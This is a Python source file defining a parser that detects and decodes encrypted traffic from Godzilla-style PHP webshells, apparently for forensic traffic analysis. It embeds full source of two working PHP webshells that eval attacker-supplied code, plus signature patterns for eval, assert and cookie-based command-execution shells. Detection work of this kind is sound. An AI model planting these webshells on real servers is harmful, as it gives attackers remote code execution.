from __future__ import annotations

import base64
import gzip
import hashlib
from urllib.parse import parse_qs
import re
from typing import Any
import zlib


class GodzillaParser:
    name = "godzilla"
    _SERIALIZED_PARAM_KEYS = {
        "className",
        "codeName",
        "content",
        "dirName",
        "fileName",
        "methodBody",
        "methodName",
        "mode",
        "path",
        "pwd",
    }

    _SUPPORTED_VARIANTS = (
        {
            "id": "godzilla_php_xor_zlib_v1",
            "family_variant": "godzilla_like",
            "label": "哥斯拉类 PHP WebShell",
            "mode": "marker_zlib",
            "key": "e10adc39",
            "kh": "49ba59abbe56",
            "kf": "e057f20f883e",
            "p": "vkzJl2VQbzhPhLHS",
            "crypto": "raw-body marker + base64 + XOR(key=e10adc39) + zlib",
            "php_source": """<?php
$k="e10adc39";$kh="49ba59abbe56";$kf="e057f20f883e";$p="vkzJl2VQbzhPhLHS";
function x($t,$k){$c=strlen($k);$l=strlen($t);$o="";for($i=0;$i<$l;){for($j=0;($j<$c&&$i<$l);$j++,$i++){$o.=$t{$i}^$k{$j};}}return $o;}
if (@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==1) {
    @ob_start();
    @eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
    $o=@ob_get_contents();@ob_end_clean();
    $r=@base64_encode(@x(@gzcompress($o),$k));
    print("$p$kh$r$kf");
}
?>""",
        },
        {
            "id": "godzilla_php_xor_base64_session_v1",
            "family_variant": "godzilla_like",
            "label": "哥斯拉类 PHP WebShell（SESSION/XOR/Base64）",
            "mode": "session_xor_base64",
            "pass": "pass",
            "payload_name": "payload",
            "crypto": "form param pass=base64(xor(data,key[(i+1)&15])); response 16hex + base64(xor(output,key[(i+1)&15])) + 16hex",
            "php_source": """<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $D[$i] = $D[$i]^$K[($i+1)&15];
    }
    return $D;
}
$pass='pass';
$payloadName='payload';
$key='<unknown>';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
        eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
?>""",
        },
    )

    def supported_families(self) -> list[dict[str, str]]:
        families: list[dict[str, str]] = []
        seen: set[str] = set()
        for variant in self._SUPPORTED_VARIANTS:
            key = str(variant["family_variant"])
            if key in seen:
                continue
            seen.add(key)
            families.append(
                {
                    "value": key,
                    "label": str(variant["label"]),
                }
            )
        return families

    def identify_request_variant(self, body: str) -> dict[str, Any] | None:
        for variant in self._SUPPORTED_VARIANTS:
            if not self._match_request_variant(body, variant):
                continue
            return dict(variant)
        return None

    def identify_response_variant(self, body: str) -> dict[str, Any] | None:
        for variant in self._SUPPORTED_VARIANTS:
            if not self._match_response_variant(body, variant):
                continue
            return dict(variant)
        return None

    def match_request(self, body: str) -> bool:
        return self.identify_request_variant(body) is not None

    def match_response(self, body: str, request_parse: dict[str, Any] | None = None) -> bool:
        variant = self._variant_from_request_parse(request_parse)
        if variant is not None and self._match_response_variant(body, variant):
            return True
        return self.identify_response_variant(body) is not None

    def parse_request(self, body: str) -> dict[str, Any] | None:
        variant = self.identify_request_variant(body)
        if variant is None:
            return None

        if str(variant.get("mode") or "") == "session_xor_base64":
            return self._parse_session_request(body, variant)

        decoded = self._decode_payload(body, variant, response=False)
        if decoded is None:
            return None

        decoded_text = self._decode_text(decoded)
        terminal_command, parsed_operation, target_path = self._terminal_command(decoded_text)
        request_summary = self._request_summary(parsed_operation, terminal_command)
        return {
            "family_parser": self.name,
            "family_variant": str(variant["family_variant"]),
            "godzilla_variant_id": str(variant["id"]),
            "webshell_label": f"可能是{variant['label']}",
            "parsed_operation": parsed_operation,
            "target_path": target_path,
            "request_summary": request_summary,
            "terminal_command": terminal_command,
            "decoded_request": decoded_text,
            "php_script_source": str(variant["php_source"]),
            "crypto_summary": str(variant["crypto"]),
            "session_markers": {
                "p": variant["p"],
                "kh": variant["kh"],
                "kf": variant["kf"],
            },
        }

    def parse_response(
        self,
        *,
        body: str,
        request_parse: dict[str, Any] | None = None,
    ) -> dict[str, Any] | None:
        variant = self._variant_from_request_parse(request_parse) or self.identify_response_variant(body)
        if variant is None:
            return None

        if str(variant.get("mode") or "") == "session_xor_base64":
            return self._parse_session_response(body, variant, request_parse=request_parse)

        decoded = self._decode_payload(body, variant, response=True)
        if decoded is None:
            return None

        text = self._normalize_output(self._decode_text(decoded))
        return {
            "output_type": "command_output",
            "output_summary": f"返回 {len(text)} 字符",
            "output_preview": self._trim(text, 240),
            "output": self._trim(text, 2000),
            "terminal_output": self._trim(text, 4000),
            "parsed_output": {
                "content": self._trim(text, 4000),
                "length": len(text),
            },
        }

    def session_key_digest(self, pass_name: str, key: str) -> str:
        return hashlib.md5(f"{pass_name}{key}".encode("utf-8", errors="ignore")).hexdigest()

    def session_key_matches_markers(self, *, pass_name: str, left: str, right: str, key: str) -> bool:
        digest = self.session_key_digest(pass_name, key)
        return digest == f"{str(left or '').lower()}{str(right or '').lower()}"

    def decode_session_request_with_key(self, *, body: str, key: str, pass_name: str = "pass") -> dict[str, Any] | None:
        request_data = self._extract_session_request(body, {"pass": pass_name})
        if request_data is None:
            return None
        decoded = self._xor_session_bytes(self._b64decode_loose(request_data["encoded"]), key)
        return self._describe_session_blob(decoded, kind="request")

    def decode_session_response_with_key(self, *, body: str, key: str) -> dict[str, Any] | None:
        response_data = self._extract_session_response(body)
        if response_data is None:
            return None
        decoded = self._xor_session_bytes(self._b64decode_loose(response_data["encoded"]), key)
        return self._describe_session_blob(decoded, kind="response")

    def _variant_from_request_parse(self, request_parse: dict[str, Any] | None) -> dict[str, Any] | None:
        variant_id = str((request_parse or {}).get("godzilla_variant_id") or "").strip()
        if not variant_id:
            return None
        for variant in self._SUPPORTED_VARIANTS:
            if str(variant["id"]) == variant_id:
                return dict(variant)
        return None

    def _match_request_variant(self, body: str, variant: dict[str, Any]) -> bool:
        if str(variant.get("mode") or "") == "session_xor_base64":
            return self._extract_session_request(body, variant) is not None
        return self._extract_ciphertext(body, variant, response=False) is not None

    def _match_response_variant(self, body: str, variant: dict[str, Any]) -> bool:
        if str(variant.get("mode") or "") == "session_xor_base64":
            return self._extract_session_response(body) is not None
        return self._extract_ciphertext(body, variant, response=True) is not None

    def _decode_payload(self, body: str, variant: dict[str, Any], *, response: bool) -> bytes | None:
        encoded = self._extract_ciphertext(body, variant, response=response)
        if not encoded:
            return None
        try:
            raw = self._b64decode_loose(encoded)
            xored = self._xor_bytes(raw, str(variant["key"]))
            return zlib.decompress(xored)
        except Exception:
            return None

    def _extract_ciphertext(self, body: str, variant: dict[str, Any], *, response: bool) -> str | None:
        if not body:
            return None

        source = str(body)
        if response:
            prefix = str(variant["p"])
            prefix_index = source.find(prefix)
            if prefix_index >= 0:
                source = source[prefix_index + len(prefix) :]

        kh = re.escape(str(variant["kh"]))
        kf = re.escape(str(variant["kf"]))
        match = re.search(rf"{kh}(?P<data>[A-Za-z0-9+/=]+?){kf}", source, re.S)
        if not match:
            return None
        data = re.sub(r"\s+", "", match.group("data") or "")
        return data or None

    def _parse_session_request(self, body: str, variant: dict[str, Any]) -> dict[str, Any] | None:
        request_data = self._extract_session_request(body, variant)
        if request_data is None:
            return None

        raw_size = len(self._b64decode_loose(str(request_data["encoded"])))
        operation = "session_payload_init" if raw_size >= 256 else "encrypted_command"
        request_summary = "发送 Godzilla Session 初始化载荷" if operation == "session_payload_init" else "发送 Godzilla Session 加密请求"
        return {
            "family_parser": self.name,
            "family_variant": str(variant["family_variant"]),
            "godzilla_variant_id": str(variant["id"]),
            "webshell_label": f"可能是{variant['label']}",
            "parsed_operation": operation,
            "request_summary": request_summary,
            "terminal_command": None,
            "php_script_source": str(variant["php_source"]),
            "crypto_summary": str(variant["crypto"]),
            "session_markers": {
                "pass": request_data["param_name"],
            },
        }

    def _parse_session_response(
        self,
        body: str,
        variant: dict[str, Any],
        *,
        request_parse: dict[str, Any] | None = None,
    ) -> dict[str, Any] | None:
        response_data = self._extract_session_response(body)
        if response_data is None:
            return None

        session_markers = {
            "left": response_data["left"],
            "right": response_data["right"],
        }
        pass_name = str(((request_parse or {}).get("session_markers") or {}).get("pass") or "").strip()
        if pass_name:
            session_markers["pass"] = pass_name

        return {
            "output_type": "encrypted_response",
            "parsed_output": {
                "encrypted_length": len(response_data["encoded"]),
                "marker_left": response_data["left"],
                "marker_right": response_data["right"],
            },
            "family_parser": self.name,
            "family_variant": str(variant["family_variant"]),
            "godzilla_variant_id": str(variant["id"]),
            "webshell_label": f"可能是{variant['label']}",
            "crypto_summary": str(variant["crypto"]),
            "php_script_source": str(variant["php_source"]),
            "session_markers": session_markers,
        }

    def _extract_session_request(self, body: str, variant: dict[str, Any]) -> dict[str, str] | None:
        params = parse_qs(str(body or ""), keep_blank_values=True)
        pass_name = str(variant.get("pass") or "pass")
        values = params.get(pass_name) or []
        if len(params) != 1 or len(values) != 1:
            return None
        encoded = re.sub(r"\s+", "", values[0] or "")
        if not self._looks_like_base64(encoded, min_length=24):
            return None
        return {
            "param_name": pass_name,
            "encoded": encoded,
        }

    def _extract_session_response(self, body: str) -> dict[str, str] | None:
        cleaned = re.sub(r"\s+", "", str(body or ""))
        match = re.fullmatch(r"(?P<left>[0-9a-fA-F]{16})(?P<data>[A-Za-z0-9+/=]{16,})(?P<right>[0-9a-fA-F]{16})", cleaned)
        if not match:
            return None
        return {
            "left": match.group("left"),
            "encoded": match.group("data"),
            "right": match.group("right"),
        }

    def _b64decode_loose(self, text: str) -> bytes:
        compact = re.sub(r"\s+", "", text)
        padding = (-len(compact)) % 4
        return base64.b64decode(compact + ("=" * padding), validate=False)

    def _looks_like_base64(self, text: str, *, min_length: int) -> bool:
        compact = re.sub(r"\s+", "", str(text or ""))
        if len(compact) < min_length:
            return False
        return re.fullmatch(r"[A-Za-z0-9+/=]+", compact) is not None

    def _xor_session_bytes(self, data: bytes, key: str) -> bytes:
        key_bytes = key.encode("utf-8", errors="ignore")
        if not key_bytes:
            return b""
        if len(key_bytes) >= 16:
            session_key = key_bytes[:16]
        else:
            repeat = ((16 - 1) // len(key_bytes)) + 1
            session_key = (key_bytes * repeat)[:16]
        return bytes(byte ^ session_key[(idx + 1) & 15] for idx, byte in enumerate(data))

    def _describe_session_blob(self, data: bytes, *, kind: str) -> dict[str, Any]:
        raw_text, encoding, printable_ratio = self._best_effort_text(data)
        is_text = printable_ratio >= 0.8
        text = raw_text if is_text else None
        preview = text if text else data[:96].hex()
        summary = f"{kind} {len(data)}B"
        nested_analysis = None
        structured_data = None

        if kind == "request" and not is_text:
            structured = self._describe_session_request_structure(data)
            if structured is not None:
                structured_data = structured["params"]
                text = structured["text"]
                preview = structured["preview"]
                summary = structured["summary"]
                nested_analysis = self._inspect_nested_param_values(structured["params"])
        if text is None:
            transformed = self._describe_transformed_blob(data, kind=kind)
            if transformed is not None:
                text = transformed["text"]
                preview = transformed["preview"]
                summary = transformed["summary"]
                encoding = transformed["encoding"]

        if text is not None and nested_analysis is None:
            nested_analysis = self._inspect_embedded_webshell(text)
        if text is not None and summary == f"{kind} {len(data)}B":
            summary = f"{kind} 文本 {len(text)} 字符"
        if nested_analysis:
            summary = f"{summary}; nested={nested_analysis['label']}"
        return {
            "kind": kind,
            "byte_length": len(data),
            "is_text": text is not None,
            "encoding": encoding,
            "printable_ratio": round(printable_ratio, 3),
            "text": self._trim(text, 8000) if text is not None else None,
            "preview": self._trim(preview, 8000),
            "summary": summary,
            "structured_data": structured_data,
            "nested_analysis": nested_analysis,
        }

    def _best_effort_text(self, data: bytes) -> tuple[str, str | None, float]:
        best_text = ""
        best_encoding = None
        best_ratio = -1.0
        for encoding in ("utf-8", "gb18030", "latin1"):
            try:
                text = data.decode(encoding)
            except UnicodeDecodeError:
                continue
            ratio = self._printable_ratio(text)
            if ratio > best_ratio:
                best_text = text
                best_encoding = encoding
                best_ratio = ratio
        if best_ratio < 0:
            best_text = data.decode("latin1", errors="replace")
            best_encoding = "latin1"
            best_ratio = self._printable_ratio(best_text)
        return self._normalize_output(best_text), best_encoding, best_ratio

    def _describe_transformed_blob(self, data: bytes, *, kind: str) -> dict[str, str] | None:
        for variant_name, variant_bytes in self._iter_transformed_variants(data):
            text, encoding, printable_ratio = self._best_effort_text(variant_bytes)
            if printable_ratio < 0.8:
                continue
            return {
                "text": text,
                "preview": text,
                "summary": f"{kind} {variant_name} 文本 {len(text)} 字符",
                "encoding": f"{variant_name}:{encoding or 'binary'}",
            }
        return None

    def _iter_transformed_variants(self, data: bytes) -> list[tuple[str, bytes]]:
        variants: list[tuple[str, bytes]] = []
        seen: set[bytes] = set()
        for variant_name, variant_bytes in (
            ("gzip", self._safe_transform(lambda: gzip.decompress(data))),
            ("zlib", self._safe_transform(lambda: zlib.decompress(data))),
            ("zlib_raw", self._safe_transform(lambda: zlib.decompress(data, -15))),
        ):
            if not variant_bytes or variant_bytes in seen:
                continue
            seen.add(variant_bytes)
            variants.append((variant_name, variant_bytes))
        return variants

    def _safe_transform(self, fn) -> bytes | None:
        try:
            value = fn()
        except Exception:
            return None
        return value if isinstance(value, bytes) and value else None

    def _describe_session_request_structure(self, data: bytes) -> dict[str, Any] | None:
        for variant_name, variant_bytes in [("raw", data), *self._iter_transformed_variants(data)]:
            parsed = self._parse_serialized_params(variant_bytes)
            if parsed is None or not self._looks_like_serialized_params(parsed):
                continue
            method_name = str(parsed.get("methodName") or "").strip()
            summary = f"request 参数 {len(parsed)} 项"
            if method_name:
                summary = f"request methodName={method_name}"
            text = self._render_serialized_params(parsed)
            return {
                "encoding": variant_name,
                "params": parsed,
                "text": text,
                "preview": text,
                "summary": summary,
            }
        return None

    def _parse_serialized_params(self, data: bytes, *, depth: int = 0) -> dict[str, Any] | None:
        if not data or depth > 4:
            return None
        index = 0
        key_bytes = bytearray()
        params: dict[str, Any] = {}
        while index < len(data):
            marker = data[index]
            if marker not in (0x01, 0x02):
                key_bytes.append(marker)
                index += 1
                continue
            if not key_bytes or index + 5 > len(data):
                return None
            value_length = int.from_bytes(data[index + 1 : index + 5], "little", signed=False)
            value_start = index + 5
            value_end = value_start + value_length
            if value_end > len(data):
                return None
            key = self._decode_serialized_key(bytes(key_bytes))
            if not key:
                return None
            value_bytes = data[value_start:value_end]
            if marker == 0x01:
                nested = self._parse_serialized_params(value_bytes, depth=depth + 1)
                if nested is None:
                    return None
                params[key] = nested
            else:
                params[key] = self._decode_serialized_value(value_bytes)
            key_bytes.clear()
            index = value_end
        if key_bytes:
            return None
        return params

    def _decode_serialized_key(self, value: bytes) -> str | None:
        try:
            text = value.decode("latin1")
        except Exception:
            return None
        if not text or self._printable_ratio(text) < 0.95:
            return None
        if any(ch in "\x00\r\n\t" for ch in text):
            return None
        return text

    def _decode_serialized_value(self, value: bytes) -> Any:
        text, _, printable_ratio = self._best_effort_text(value)
        if printable_ratio >= 0.85:
            return text
        return value.hex()

    def _looks_like_serialized_params(self, params: dict[str, Any]) -> bool:
        if not params:
            return False
        keys = self._flatten_param_keys(params)
        if not keys:
            return False
        known_hits = sum(1 for key in keys if key in self._SERIALIZED_PARAM_KEYS)
        printable_hits = sum(1 for key in keys if re.fullmatch(r"[A-Za-z0-9_.$-]{2,64}", key) is not None)
        return known_hits > 0 or printable_hits == len(keys)

    def _flatten_param_keys(self, params: dict[str, Any]) -> list[str]:
        keys: list[str] = []
        for key, value in params.items():
            keys.append(str(key))
            if isinstance(value, dict):
                keys.extend(self._flatten_param_keys(value))
        return keys

    def _render_serialized_params(self, params: dict[str, Any], *, prefix: str = "") -> str:
        lines: list[str] = []
        for key, value in params.items():
            if isinstance(value, dict):
                lines.append(f"{prefix}{key}:")
                nested_text = self._render_serialized_params(value, prefix=f"{prefix}  ")
                if nested_text:
                    lines.append(nested_text)
                continue
            lines.append(f"{prefix}{key}={value}")
        return "\n".join(lines).strip()

    def _inspect_nested_param_values(self, params: dict[str, Any]) -> dict[str, Any] | None:
        for value in self._flatten_param_values(params):
            if not isinstance(value, str) or len(value) < 32:
                continue
            nested = self._inspect_embedded_webshell(value)
            if nested is not None:
                return nested
        return None

    def _flatten_param_values(self, params: dict[str, Any]) -> list[Any]:
        values: list[Any] = []
        for value in params.values():
            if isinstance(value, dict):
                values.extend(self._flatten_param_values(value))
            else:
                values.append(value)
        return values

    def _inspect_embedded_webshell(self, text: str) -> dict[str, Any] | None:
        normalized_text = self._normalize_output(text)
        if not normalized_text:
            return None
        normalized_signature = self._normalize_signature_text(normalized_text)
        decoded_wrapper = self._decode_spaced_base64_wrapper(normalized_text)
        if decoded_wrapper:
            nested = self._inspect_embedded_webshell(decoded_wrapper)
            if nested is not None:
                return {
                    **nested,
                    "summary": f"{nested['summary']}; decoded=spaced_base64",
                }
        if self._looks_like_godzilla_payload_source(normalized_signature):
            return {
                "label": "可能是哥斯拉 PHP Payload",
                "family_variant": "godzilla_like",
                "summary": "检测到哥斯拉内存 Payload 源码",
            }
        if self._looks_like_cookie_exec_source(normalized_signature):
            return {
                "label": "可能是 Cookie 命令执行类 PHP WebShell",
                "family_variant": "cookie_exec_like",
                "summary": "检测到 Cookie 命令执行脚本源码",
            }
        if "array_map(assert" in normalized_signature:
            return {
                "label": "可能是 Assert Loader WebShell",
                "family_variant": "assert_loader_like",
                "summary": "检测到 assert loader 特征",
            }
        if "eval($_post[" in normalized_signature or "base64_decode($_post[" in normalized_signature:
            return {
                "label": "可能是 PHP Eval Loader WebShell",
                "family_variant": "php_eval_loader",
                "summary": "检测到 eval/base64_decode PHP loader 特征",
            }
        return None

    def _looks_like_godzilla_payload_source(self, normalized_signature: str) -> bool:
        required_tokens = (
            "functionrun($pms)",
            "functiong_deserialize($pms)",
            "functionevalfunc()",
            "methodname",
            "includecode",
        )
        return all(token in normalized_signature for token in required_tokens)

    def _looks_like_cookie_exec_source(self, normalized_signature: str) -> bool:
        return (
            "isset($_cookie[cm])" in normalized_signature
            and "system(base64_decode($_cookie[cm])" in normalized_signature
            and "setcookie($_cookie[cn]" in normalized_signature
        )

    def _decode_spaced_base64_wrapper(self, text: str) -> str | None:
        matches = re.findall(r"['\"]([A-Za-z0-9+/=\s]{80,})['\"]", str(text or ""), re.S)
        for match in matches:
            compact = re.sub(r"\s+", "", match)
            if len(compact) < 80 or not re.fullmatch(r"[A-Za-z0-9+/=]+", compact):
                continue
            try:
                decoded = base64.b64decode(compact + ("=" * ((4 - len(compact) % 4) % 4)), validate=False)
            except Exception:
                continue
            decoded_text, _, printable_ratio = self._best_effort_text(decoded)
            if printable_ratio >= 0.8:
                return decoded_text
        return None

    def _printable_ratio(self, text: str) -> float:
        if not text:
            return 0.0
        printable = sum(char.isprintable() or char in "\r\n\t" for char in text)
        return printable / max(len(text), 1)

    def _normalize_signature_text(self, value: str) -> str:
        return re.sub(r"[\s\"'`\\\.]+", "", str(value or "")).lower()

    def _xor_bytes(self, data: bytes, key: str) -> bytes:
        key_bytes = key.encode("utf-8", errors="ignore")
        return bytes(byte ^ key_bytes[idx % len(key_bytes)] for idx, byte in enumerate(data))

    def _decode_text(self, data: bytes) -> str:
        try:
            return data.decode("utf-8")
        except UnicodeDecodeError:
            return data.decode("latin1", errors="replace")

    def _terminal_command(self, decoded_text: str) -> tuple[str, str, str | None]:
        text = str(decoded_text or "").strip()
        if not text:
            return "", "execute_php", None

        target_path = self._extract_php_string(text, r"@?chdir\('((?:\\'|[^'])*)'\)")
        system_command = self._extract_php_string(text, r"@?system\('((?:\\'|[^'])*)'\)")
        lines: list[str] = []

        if target_path and target_path not in {".", "./"}:
            lines.append(f"cd {target_path}")

        if system_command:
            command = system_command.replace(" 2>&1", "").strip()
            lines.append(command or system_command)
            return "\n".join(lines).strip(), "execute_command", target_path

        if "@getcwd()" in text:
            lines.append("pwd")
            return "\n".join(lines).strip(), "print_workdir", target_path

        if "posix_getpwuid" in text or "getenv('username')" in text.lower():
            lines.append("whoami")
            return "\n".join(lines).strip(), "whoami", target_path

        if "gethostname" in text:
            lines.append("hostname")
            return "\n".join(lines).strip(), "hostname", target_path

        echo_value = self._extract_echo_value(text)
        if echo_value is not None:
            lines.append(f"echo {echo_value}")
            return "\n".join(lines).strip(), "echo", target_path

        return text, "execute_php", target_path

    def _extract_php_string(self, text: str, pattern: str) -> str | None:
        match = re.search(pattern, text, re.IGNORECASE)
        if not match:
            return None
        return self._unescape_php_string(match.group(1))

    def _extract_echo_value(self, text: str) -> str | None:
        match = re.search(r"echo\((\d+)\)", text, re.IGNORECASE)
        if match:
            return match.group(1)
        match = re.search(r"echo\s+['\"]([^'\"]+)['\"]", text, re.IGNORECASE)
        if match:
            return match.group(1)
        return None

    def _unescape_php_string(self, value: str) -> str:
        text = str(value or "")
        return text.replace("\\\\", "\\").replace("\\'", "'").replace('\\"', '"')

    def _request_summary(self, operation: str, command: str) -> str:
        if operation == "execute_command" and command:
            return f"执行命令 {command.splitlines()[-1]}"
        if operation == "print_workdir":
            return "获取当前工作目录"
        if operation == "whoami":
            return "获取当前用户"
        if operation == "hostname":
            return "获取主机名"
        if operation == "echo":
            return "执行回显测试"
        return "执行 Godzilla PHP 载荷"

    def _normalize_output(self, text: str) -> str:
        return str(text or "").replace("\r\n", "\n").strip()

    def _trim(self, value: Any, limit: int) -> str:
        text = str(value or "")
        if len(text) <= limit:
            return text
        return text[: limit - 3] + "..."
